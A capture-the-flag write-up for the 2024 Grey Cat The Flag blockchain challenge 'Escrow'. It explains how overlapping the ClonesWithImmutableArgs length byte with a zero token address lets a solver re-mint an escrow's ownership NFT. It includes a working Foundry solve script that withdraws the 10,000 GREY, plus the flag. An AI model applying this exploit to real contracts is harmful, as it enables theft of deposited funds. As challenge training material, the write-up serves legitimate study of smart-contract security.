---
title: Blockchain - Escrow
description: 2024 | Grey Cat The Flag | Blockchain
tags:
    - smart contract
    - clones with immutable args
---

## Description

Introducing NFT-based escrows - you can deposit assets and trade escrows by selling your ownership NFT! However, I accidentally renounced ownership for my own escrow. Can you help me recover the funds?

> nc challs.nusgreyhats.org 30101

> [Challenge Files](https://github.com/MiloTruck/evm-ctf-challenges/tree/8763f5fd12c3179227ec9cac0b21b959c6144dca/src/escrow)

## Solution

- 10,000 GREY has been deposited into `DualAssetEscrow`, which is deployed through `EscrowFactory`. To withdraw GREY and solve the challenge, the caller should be the owner of EscrowFactory NFT with certain `escrowId`
- `escrowId` is determined by the addresses obtained from immutable arguments

    ```js
    function initialize() external {
        if (initialized) revert AlreadyInitialized();
        ...
        if (msg.data.length > 66) revert CalldataTooLong();
        
        initialized = true;

        (address factory, address tokenX, address tokenY) = _getArgs();
        escrowId = uint256(keccak256(abi.encodePacked(IDENTIFIER, factory, tokenX, tokenY)));
    }
    ```

- EscrowFactory NFT can only be minted via the `deployEscrow()` function. However, the hash of arguments used in cloning will be recorded and can not be used again. We have to pass different arguments but the result of `_getArgs()` should remain the same as the previously deployed `DualAssetEscrow` to receive an NFT with the same `escrowId`

    ```js
    function deployEscrow(
        uint256 implId,
        bytes memory args
    ) external returns (uint256 escrowId, address escrow) {
        // Get the hash of the (implId, args) pair
        bytes32 paramsHash = keccak256(abi.encodePacked(implId, args));

        // If an escrow with the same (implId, args) pair exists, revert
        if (deployedParams[paramsHash]) revert AlreadyDeployed();

        // Mark the (implId, args) pair as deployed
        deployedParams[paramsHash] = true;
        
        // Grab the implementation contract for the given implId
        address impl = escrowImpls[implId];

        // Clone the implementation contract and initialize it with the given parameters.
        escrow = impl.clone(abi.encodePacked(address(this), args));
        IEscrow(escrow).initialize();

        // Get the ID for the deployed escrow
        escrowId = IEscrow(escrow).escrowId();

        // Mint an ERC721 token to represent ownership of the escrow
        _mint(msg.sender, escrowId);
    }
    ```

- We can not simply adding extra bytes to `args` due to the calldata length check in `DualAssetEscrow::initialize()`. Although adding extra bytes can make `runSize` exceed 65535 bytes and deploy a contract with the expected arguments, the transaction will revert with an out of gas error
- When the `ClonesWithImmutableArgs` proxy is called, the immutable arguments and a 2-byte length field will be appended to the calldata of the delegate call to the implementation contract. The argument is read based on the starting offset and its type

    ```js
    /// @notice Reads an immutable arg with type address
    /// @param argOffset The offset of the arg in the packed data
    /// @return arg The arg value
    function _getArgAddress(uint256 argOffset)
        internal
        pure
        returns (address arg)
    {
        uint256 offset = _getImmutableArgsOffset();
        // solhint-disable-next-line no-inline-assembly
        assembly {
            arg := shr(0x60, calldataload(add(offset, argOffset)))
        }
    }
    ```

- Since `tokenY` is `address(0)` and the first byte of the length field is unused, the first byte of the length field can be utilized as the last byte of the `tokenY`, thus reducing the `args` passed to `deployEscrow()` by one byte, resulting in a different `paramsHash`

    ```js
    // Deploy a DualAssetEscrow
    (escrowId, escrow) = factory.deployEscrow(
        0,  // implId = 0
        abi.encodePacked(address(grey), address(0)) // tokenX = GREY, tokenY = ETH
    );
    ```

### Exploitation

```js
contract Solve is Script {
    function run() public {
        Setup setup = Setup(vm.envAddress("INSTANCE"));
        EscrowFactory factory = setup.factory();
        address grey = address(setup.grey());
        address escrow = setup.escrow();
        vm.startBroadcast(vm.envUint("PRIV"));
        factory.deployEscrow(
            0,  // implId
            abi.encodePacked(
                grey,
                new bytes(19)
            )
        );
        DualAssetEscrow(escrow).withdraw(true, 10_000e18);
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}
```

### Flag

> grey{cwia_bytes_overlap_5a392abcfa2d040a}
